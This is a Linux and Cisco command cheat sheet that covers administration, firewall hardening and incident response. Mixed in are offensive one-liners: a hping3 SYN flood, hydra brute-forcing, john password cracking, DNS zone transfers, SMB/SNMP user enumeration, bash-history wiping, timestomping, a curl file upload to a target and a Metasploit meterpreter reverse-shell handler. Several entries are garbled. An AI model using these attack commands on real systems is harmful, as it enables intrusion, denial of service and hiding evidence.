# Nix Commands







| | |
|-|-|
aa-complain /etc/apparmor.d/*	complain mode for all profiles
aa-enforce /etc/apparmor.d/*	enforce mode for all profiles
addgroup <groupname>	
adduser <username>	
aide --init | --check	initialize or check AIDE
apt-cache search <regex>	Search available pkgs.
apt-get check <pkg>	 Integrity check and fix.
apt-get install <pkg>	Install a pkg.
apt-get remove <pkg>	 Uninstall a pkg.  
apt-get update  	Update available pkgs.
apt-get upgrade	Install latest versions.
chage -E 01/31/2015 -m 5 -M 90 -I 30 -W 14 username	set expire date, 5 day min, 90 day max, 5 day inactive, 14 day warning
delgroup <groupname>	delete a group
deluser <username>	delete a user
dhclient  	renew ip address
dhclient -r	release ip address
dig axfr domain.com @ns1.domain.com	Linux DNS zone transfer
dig -t a hostname @dnsserver	Check cache of suspect DNS server
dig -x 192.168.1.1	Dig reverse lookup
dmesg | grep 'error grep 'error/var/log/syslog	unusual server & application crashes
dns	file
dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std	DNS Recon
dos2unix	Convert Windows file to Unix / Linux.
dpkg -l	List installed packages.
dpkg -S <path-to-binary>          	Who owns this file?                
dpkg-statoverride --update --add root admin 4750 /bin/su	Limit use of su to admin group
du OR df -al	file space usage
duplicity /backup /home	restore
duplicity /home /backup	does incremental backup with built-in encryption

## echo
| | |
|-|-|	
echo "1" > /proc/sys/net/ipv4/ip_forward	Enable IP forwarding
echo "8.8.8.8" > /etc/resolv.conf	Use Google DNS
echo "This is the mail body" | mail username@domainname[d]com	send a test email
echo '0.0.0.0 www.evil.com' >> /etc/hosts	block evil domain
echo 1 > /proc/sys/net/ipv4/ip_forward	
echo 1 > /proc/sys/net/ipv4/tcp_syncookies	Use SYN cookies (non-persistent)
echo -e 'authdeny=5 unlock_time=60' | tee  --append /etc/pam.d/login	Enable automatic temporary lockouts
echo nameserver 192.168.1.3 > /etc/resolv.conf	add nameserver
echo 'nospoof on' | tee –-append /etc/host.conf net.ipv4.conf.default.rp_filter=1  (in /etc/sysctl.conf) net.ipv4.conf.all.rp_filter=1  	Anti-spoof settings
enable	Enters enable mode
enable chroot	Enable chroot environment
encfs ~/.encrypted ~/visible	Create an encrypted directory, unlock, lock
EncFS, eCryptfs, 7zip for F/F; LUKS, VeraCrypt, LibreCrypt for HD	Encrypt data on hard drives
enum4linux -a $ip	Do Everything, runs all options
error.log	after
fdisk -l	get all removable media info
file2	files

## find
| | |
|-|-|
find . -type f -printf "%C@ %p| sort -rn | head -n 10	recently created files
find ./ -name ".*" -ls	recent hidden files
find ./ -type f | xargs grep -l whateverstring	search for file matching string
find / -mtime -2d -ls	
find / -name " *" -o -name ". *" -o -name ".. *" -print	weird file names
find / -nouser -o -nogroup -print	look for orphaned files
find / -nouser -o -nogroup-print 2>/dev/null | less	orphaned files
find / -perm -o=w -print	show world-writable directories
find / -size +10000k -print	files larger than 10 MB
find / -type f -perm -04000 -o -perm -02000 -print	find suid/sgid files
find / -uid 0 -perm -4000 -print	unusual SUID root files
find /dev -type d -exec ls -ld {} \;	run a command on all files
find /dev -type d -print	find all subdirectories
find /etc -mtime -1 -print	recently modified files
free -mo	MB of free memory and swap
fusermount -u ~/visible	unlock encrypted directory

## gcc
| | |
|-|-|
gcc -m32 exploit.c -o exploit	Compile 32 bit binary on 64 bit Linux
gcc -o exploit exploit.c	Basic GCC compile
gcc -o output.c input.c	Compile C code.
gpg --gen-key	generate key pair in GPG
gpg --output revoke.asc --gen-revoke $GPGKEY	Create a Revocation Key/Certificate
gpg --armor --output pubkey.txt --export 'Andrew Staples'	Generate an ASCII version of your public key
gpg -e -r 'Your Name' foo.txt	Encrypt a file for personal use
gpg -e -r 'Recipient Name' foo.txt	Encrypt a file for someone else
gpg -s foo.txt	Sign a file
gpg --output foo.txt --decrypt foo.txt.gpg	Decrypt a file from someone else
gpg --send-keys 'Andrew Staples' --keyserver keyserver.ubuntu.com	Send public key to server

## grep
| | |
|-|-|
grep :0: /etc/passwd	list UID and GUID 0 accounts
grep Accepted auth.log | cut -d " " -f 1,2,3,9,11	Show successful attempts
grep error /var/log/apache2/access.log	many apache logs saying “error”
grep error /var/log/auth.log	Error messages from SSH clients
grep 'Failed' auth.log | grep invalid | cut -d " " -f 1,2,3,11,13,15	Show fails with invalid user
grep 'Failed' auth.log | grep root | cut -d " " -f 1,2,3,9,11	Show failed attempts
grep -R "W7" /usr/share/metasploit-framework/modules/exploit/windows/*	Search metasploit modules using grep - msf search sucks a bit
grep -R promisc /var/log/	entered promiscuous mode
grep 'session closed' auth.log	logoffs
gzip -d archive.gz	Extract a gzip file Linux.
gzip file	Creates a file.gz file
host $ip	Reverse lookup
host -l domain.com nameserver	Perform a DNS zone transfer using host.
hping3 --flood -S -p $2 $1	DoS SYN flood

## hydra
| | |
|-|-|
hydra -l USERNAME -P wordlistsnmap.lst -f $ip ftp -V -t 15	ftp brute
hydra -l USERNAME -P wordlistsnmap.lst -f $ip pop3 -V -t 15	pop3 brute
hydra -P /usr/share/wordlistsnmap.lst $ip smtp -V -t 15	smtp brute
i586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe	Compile windows .exe on Linux
ifconfig eth0 192.168.1.188 netmask 255.255.255.0 up	change ip (temporary)
ifconfig eth0 192.168.2.1/24	Set IP address in Linux.
ifconfig eth0 hw ether MACADDR	Change MAC address
ifconfig eth0 mtu 1500	Change MTU size
ifconfig eth0:1 192.168.2.3/24	Add IP address to existing Net Int
ifconfig, ip link, ifstatus, promqry	Detect sniffer
ifdown eth0 && ifup eth0	restart interface
init 6	Reboot Linux from the command line
initctl list OR cat /etc/inittab	startup application
ip add route blackhole $ip	$(netstat -tulpna | grep $ip | awk…)	Control WAN/ISP
ip addr add 192.168.2.22/24 dev eth0	Add IP address hidden from ifconfig
ip link | grep PROMISC	look for sniffers (PROMISC and ARP attacks)

## iptables
| | |
|-|-|
iptables -A FORWARD -d dns -p tcp --dport 53 -j ACCEPT	inbound dns to dns server
iptables -A FORWARD -d dns -p udp --dport 53 -j ACCEPT	inbound dns to dns server
iptables -A FORWARD -d mail -p tcp --dport 25 -j ACCEPT	inbound mail to mail server
iptables -A FORWARD -d web -p tcp --dport 443 -j ACCEPT	inbound https to web server
iptables -A FORWARD -d web -p tcp --dport 80 -j ACCEPT	inbound http to web server
iptables -A FORWARD -j DROP	drop all
iptables -A FORWARD -m state --state ESTABLISHED,RELATED -j ACCEPT	established & related connections
iptables -A FORWARD -s admin -d 10.10.10.0/24 -p tcp --dport 22 -j ACCEPT	inbound ssh from admin to
iptables -A FORWARD -s dns -p tcp --dport 53 -j ACCEPT	outbound dns from dns server
iptables -A FORWARD -s dns -p udp --dport 53 -j ACCEPT	outbound dns from dns server
iptables -A FORWARD -s mail -p tcp --dport 25 -j ACCEPT	outbound mail from mail server
iptables -A INPUT -m state --state NEW -p tcp --dport 80 -j LOG --log-prefix "NEW_HTTP_CONN: " --log-level 7	enable iptable logging to dmesg
iptables -A INPUT -s $ip -j DROP;  ip route add blackhole $ip	Block source IP
iptables -A OUTPUT -p tcp -s $SERVER_IP -d 0/0 --sport 22 --dport 513:65535 -m state --state ESTABLISHED -j ACCEPT	
iptables -I FORWARD 1 -s $ip -j DROP	Filter at border router
iptables -I INPUT 1 -i lo -j ACCEPT	
iptables -I INPUT 1 -s $admin -j ACCEPT && iptables -I INPUT 2 -j DROP	Isolate or shut down target device
iptables -I INPUT 1 -s $admin -j ACCEPT
iptables -I INPUT 2 -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -I INPUT 3 -j DROP"	Block client-to-client connections
iptables -I INPUT 1 -s $admin -p tcp --dport 445 -j ACCEPT
iptables -I INPUT 2 -s $admin -p udp -m multiport --dports 135:139 -j ACCEPT
iptables -I INPUT 3 -p tcp -m multiport --dport 445 -j DROP
iptables -I INPUT 4 -p udp -m multiport --dports 135:139 -j DROP"	Configure firewalls and routers to block access to 445/tcp and 135*139/udp except for required admin or file share usage
iptables -I INPUT 1 -s $ip -j DROP	Apply filters
iptables -I INPUT 1 -s $ip -j DROP; ip route add blackhole $ip	Block source IP
iptables -I INPUT 2 -i eth0 -p udp -m multiport --sport 53,67 -m state --state ESTABLISHED,RELATED -j ACCEPT	
iptables -I INPUT 3 -i eth0 -p tcp -m multiport --sport 53,80,443,8080 -m state --state ESTABLISHED,RELATED -j ACCEPT	
"iptables -I INPUT -m state --state INVALID -j DROP
sysctl -w net/netfilter/nf_conntrack_tcp_loose=0"	Firewall rules/conntrack filtering
iptables -I INPUT -p tcp --dport 22 -m state --state NEW -m recent --update --seconds 600 --hitcount 11 -j DROP	
iptables -I INPUT -p tcp --dport 80 -m connlimit --connlimit-above 50 --connlimit-mask 20 -j DROP	Create FW rule (50 connection limit from Ips in the same /20 subnet)
iptables -I INPUT -p tcp -s $ip --syn -m limit --limit 1/s --limit-burst 3 -j RETURN	
iptables -I INPUT -p tcp -s 0/0 -d $ip --sport 513:65535 --dport 22 -m state --state NEW,ESTABLISHED -m recent --set -j ACCEPT	
iptables -I OUTPUT 1 -p tcp --tcp-flags RST RST -d $ip --dport 80 -j DROP	Block outbound TCP resets
iptables -I OUTPUT 1 -s $ip -p ICMP --icmp-type port-unreachable -j DROP	Block outbound ICMP port unreach
iptables -I OUTPUT 1 -s $ip -p ICMP --icmp-type time-exceeded -j DROP	Stop outgoing ICMP time exceed msgs
## john
| | |
|-|-|
john --format=descrypt hash --show	JTR forced descrypt brute force cracking
john --format=descrypt --wordlist /usr/share/wordlists/rockyou.txt hash.txt	JTR forced descrypt cracking with wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt hashes	JTR password cracking
## kill
| | |
|-|-|
kill -9 $$	Kill current session.
killall -9 [proc name]
fasthalt (shutdown -hqf now) OR reboot -f 	Kill process with task manager, reboot
kill -9 [pid]; apt-get --purge remove [programname] OR rm -f [filename]	   delete program communicating
last reboot	unusual reboots
lastb	failed logins
less /var/log/tiger/security.report.*	get tiger report
less +F /var/log/kern.log	firewall logs
ls /usr/share/nmap/scripts/* | grep ftp	Search nmap scripts for keywords
ls /var/at/jobs	
lsof	List open files, sockets, and other things
## lsof
| | |
|-|-|
lsof +L1	files with link count of zero
lsof -a -u jim -i	Use '-a' for logical AND
lsof -c ssh*	Only processes matching ssh*
lsof -i	Show established connections
lsof -i :$port	a specific listening port
lsof -p $pid	Show all file/ports used by a process
lsof -u $user	Only processes owned by user
macchanger -m MACADDR INTR	Change MAC address on KALI
md5sum -c blah.iso.md5	Check file against MD5SUM
md5sum file	Generate MD5SUM
mount 192.168.1.1:/vol/share /mnt/nfs	Mount NFS share to /mnt/nfs
mount -t cifs -o username=user,domain=blah //$ip/share-name /mnt/cifs	Mount Windows CIFS/SMB share on Linux
mount -t ecryptfs /srv /srv	mount encrypted folder & add files (umount will make files unavailable)
mv /home/username/.ssh/ /home/username/.ssh_old/	move keys/prevent public auth access
nano /etc/apt/apt.conf.d/10periodic\	install auto updates
nano /etc/dhcp/dhclient.conf	specify nameserver
nano /etc/login.defs <<< PASS_MAX_DAYS   90, PASS_MIN_DAYS   5, PASS_WARN_AGE   14 >>>	Enable password aging (for all users)
nano /etc/network/if-up.d/static-arp; arp -i eth0 -s $ip $hwaddr; chmod 755 static-arp; reboot	Hard code ARP tables on all machines
nano /etc/network/if-up.d/static-arp, arp -i eth0 -s $ip $hwaddr, chmod 755 static-arp && reboot"	Hard code ARP tables (persistent)
nbtscan 192.168.1.0/24	Discover Windows / Samba servers
nbtstat -A	suspicious netbios
nbtstat -A $ip	Get hostname for IP address.
net.ipv4.conf.all.accept_redirects = 0   (in /etc/sysctl.conf) net.ipv6.conf.all.accept_redirects = 0  	No source routed packets, Configure gateway the same
net.ipv4.icmp_echo_ignore_all = 1  (in /etc/sysctl.conf)	Ignore all ICMP echo requests
net.ipv4.icmp_echo_ignore_broadcasts = 1   (/etc/sysctl.conf)	Disable responses to directed broadcasts at router/firewall
net.ipv4.tcp_syncookies=1    (/etc/sysctl.conf)	Use SYN cookies (persistent)
## netstat
| | |
|-|-|
netstat -ant | grep "est" | wc -l	count of open conns
netstat -ant | grep "syn_recv" | wc -l	count of half open conn
netstat -antp; service [service] stop;  alter /etc/rc*.d files	Shut off unnecessary services
netstat -nap; more /etc/hosts; more /etc/resolv.conf	suspicious network activity
netstat -napc	suspicious network activity (scrolling)
netstat -ntu    vs   tcpdump   (established) netstat -ntulp vs tcpdump (servers)	Monitor network traffic with tcpdump and compare to port activity reported by host
netstat -ntulpa vs   tcpdump   (all)	Show all ports that are observed communicating on the network
netstat -plunt	
netstat -rn	check routing table
netstat -tulpn	Ports with process ID's (PIDs)
netstat -tulpn; kill [pid] or service [service] stop	Close all unused ports, services
netstat -tulpna | awk '/^tcp/{print $5}' | sed -r 's/:[0-9]+$//' | sort | uniq -c | sort -rn	Multiple open connections from same IP

nslookup -> set type=any -> ls -d blah.com	Windows DNS zone transfer
parted /dev/sdb mklabel msdos; parted /dev/sdb mkpart primary ext4 1 62G; mkfs -t ext4 /dev/sdb1	Format and partition in EXT4 format
parted /dev/sdb mklabel msdos; parted /dev/sdb mkpart primary ntfs 1 62G; mkntfs -Q /dev/sdb1	Format and partition in NTFS format
pass sha512 remember=5     (in /etc/pam.d/common-password)	Prohibit use of last 5 passwords
passwd [username]	Change passwords
passwd [username] -l OR usermod -e 1 [username]	Disable exploited account while fixing
password changed, new user, delete user	user account change
PATH=$PATH:/my/new-path	Add a new PATH
netstat -tulpna	discovered listening ports
## ps
| | |
|-|-|
ps -a [pid] | sort -b -k1	show Process Train details
ps aux --sort etime | grep root	strange processes with admin/root privs
ps aux --sort etime | less	strange new services
ps aux --sort -rss | head -5	Single process at 100% CPU
ps -auxf	Show processes and their parents
ps -f [pid]	show PPID
ps -if | grep http	find when service started
pstree -s -p [pid]	show Process Train
python /usr/share/doc/python-impacket-doc/examples/samrdump.py $ip	Enumerate users from SMB
python /usr/share/doc/python-impacket-doc/examples/samrdump.py SNMP $ip	Enmerate users from SNMP
rdiff-backup /home /backup	does incremental backup and versioning
rdiff-backup -r /backup /home	restore
ridenum.py $ip 500 50000 dict.txt	RID cycle SMB / enumerate users
rm -rf directoryname	delete a directory and its subs
root	ARPWatch
route add default gw 192.168.1.1	add route for default gateway
rsync -av /home/ /backup	restore
rsync -av --delete /home/ /backup	copies just the difference between files
searchsploit windows 2003 | grep -i local	Search exploit-db for exploit, in this example windows 2003 + local esc
service cron status|start|stop|restart	
service --status-all	Status of services
## show
| | |
|-|-|
show access-lists	Show access lists
show interface e0	Show detailed interface info
show ip interface	Show network interfaces
show ip route	Show routes
show running-config	Show running config loaded in memory
show session	display open sessions
show startup-config	Show sartup config
show version	show cisco IOS version
shred *remove /tmp/passwd_copyoverwrites previous bits with ones and zeros	Shred all files
shred -n 5 -v filename	force remove a file
shred -remove /tmp/passwd_copy	Overwrites bits with ones and zeros
site:exploit-db.com exploit kernel <= 3	Use google to search exploit-db.com for exploits
## smbclient
| | |
|-|-|
|smbclient -U <username> -W <domain> //server/share     ||
|smbclient -U <username> -W <domain> //server/share "<passphrase>"  |    |
|smbclient -U user -t cifs -o username=user,password=password //$ip/share /mnt/share"  | Connect to Samba share from Linux|
|smbcontrol [pid] close-share [share name]      |Delete a share|
|smbcontrol smbd close-share [share name]      | Drop all sessions|
|smbmount //server/share /mnt/win -o user=username,password=password1||
|smbstatus    |   see current SMB sessions - in|
|mount -t cifs  |check open shares|
|smbstatus; passwd $user; smbcontrol [pid] close-share sharename    |    Change PW, Drop session, restart|
|snmpcheck -t $ip -c public snmpwalk -c public -v1 $ip 1\|grep hrSWRunName\|cut -d* * -f snmpenum -t $ip onesixtyone -c names -i hosts|SNMP enumeration|
|snmpwalk public -v1 $ip 1 \|grep 77.1.2.25 \|cut -d” “ -f4       Enmerate users from SNMP|
|sort -nk3 -t: /etc/passwd \| less   |    look for new accounts|

## ssh
| | |
|-|-|
|ssh [email protected] | cat /dev/null > ~/.bash_history      |  clear bash history|
|ssh -D 127.0.0.1:9050 [email protected]     |   Dynamically allows all port forwards to the subnets available on target.|
|ssh -L9999:10.0.2.2:445 user@middle |   LPort 9999 forwarded to 10.0.2.2:445 through host middle|
|ssh-copy-id user5@127.0.0.1   | copy keys to server|
|ssh-keygen -t rsa -b 4096    |  generate ssh keys|
|startup-config running-config||
|strace ifconfig      | Show system calls of ifconfig|
|strace -p <PID#>     |  System calls of a running process|
|sudo & COMMAND, failed su   |   sudo actions|
|sudo chage -l username password min/max age|
|sudo kill -HUP $(pgrep dnsmasq)     |   * flush local dns cache|
|sudo nano /etc/pam.d/common-password  | password requirements|
## tar
| | |
|-|-|
|tar cf archive.tar files   |    Creates a tar file|
|tar cjf archive.tar.bz2 files | Creates a tar.bz2 file|
|tar cvzf /backup/backup/tgz /home    |  create archive, gzip compress, place in backup/backup|
|tar czf archive.tar.gz files |  Creates a tar.gz file|
|tar xf archive.tar    | Extract tar file Linux.|
|tar xjf archive.tar.bz2  |      Extract a tar.bz2 file Linux.|
|tar xvpzf /backup/backup.tgz -C /home | uncompress and copy to the /home directory|
|tar xvzf archive.tar.gz        |Extract a tar.gz file Linux.|
|tar ztvf file.tar.gz | grep blah    |   Search inside a tar.gz file.|
|tcpkill -9 host google.com   |  Kills TCP to google.com from host|
|tcpkill -i eth0 port 21      |  Kill all outgoing FTP|
|tcpkill ip host 192.168.1.2 and not 192.168.1.111     | Kill all IP for host except to .111|
|terminal length 0     | No limit on terminal output|
|top    |Running process tree and load.|
|touch -r ref-file new-file    | New file with TS data from reference file|
|touch -t 200904291446.53 /tmp/timestamp find -newer /tmp/timestamp -ls all files modified after a specific time|
|uname -a; hwinfo; lspci   |     system information|
|unset HISTORYFILE    |  Disable bash history logging.|
|unzip archive.zip    |  Extracts zip file on Linux.|
|uptime && free |load average & utilization of memory|
|upx -9 -o output.exe input.exe |UPX compress .exe file|


## usermod
| | |
|-|-|
|usermod --expiredate 1 [username]    |  Quarantine victim's account|
|usermod --expiredate -1 [username]   |  Restore accounts, reset passwords|
|userdel -r [username] | Remove account|
|usermod -a -G \<username\> \<groupname\>       ||
|vim file.txt.gz       | Read a .txt.gz file|
|vmstat -s     | memory usage|
|vmstat -s    |  Virtual memory stats|
|watch ss -stplu   |    Watch TCP, UDP open ports in real time|
|who | grep username (get pts/#) &&|pkill -f pts/#   |   Kill any ssh connections by user|
|zcat archive.gz       | Read a gz file|
|zgrep 'blah' /var/log/maillog*.gz     | Search a gz file|
|zgrep 'new user' /var/log/auth*     |   extra accounts appearing on system|
|zip -r file.zip /dir/* Creates a .zip file|
|zipgrep *.txt archive.zip    |  Search inside a .zip archive.|
|zless archive.gz       |Read a gz file|
|dmesg  |display or control the kernel ring buffer|
|curl –X OPTIONS –v http//$ip  | check options|
|curl –upload-file /root/file.txt –v –url http//$ip/test/file.sh -0 --http1.0 |  put file|
|./msfconsole -x “use exploit/multi/handler; set payload windows/meterpreter/reverse_https; set LHOST $ip; set PORT 8443; run” | set up handler|
|while read p; do ping -a -n 1 $p | grep Pinging; done < 1.txt  |loop through a file|
|cat 1.txt | while read line; do ping -a -n 1 $line | grep Reply; done  loop through a file|
|lsblk -o NAME,FSTYPE,SIZE,MOUNTPOINT,LABEL  |   list all HD/Partitions|